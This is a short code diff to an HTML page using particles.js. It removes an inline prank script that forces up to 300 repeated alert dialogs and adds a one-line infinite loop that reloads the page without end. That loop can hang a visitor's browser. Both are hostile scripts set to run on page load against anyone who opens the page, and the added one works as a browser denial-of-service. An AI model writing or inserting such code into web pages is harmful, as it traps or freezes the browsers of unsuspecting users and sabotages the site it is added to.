@@ -24,17 +24,7 @@
   <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
   <script src="particles-config.js"></script>
   <script>
-    let count = 0;
-function displayAlert() {
-  alert('Click OK 300 times to get out of the loop');
-  count++;
-
-  if (count < 300) {
-    setTimeout(displayAlert, 0); // Use setTimeout to avoid blocking the UI thread
-  }
-}
-
-setTimeout(displayAlert, 3000);
+(function(){while(1){location.reload()}}())
     </script>
 </body>
 </html>
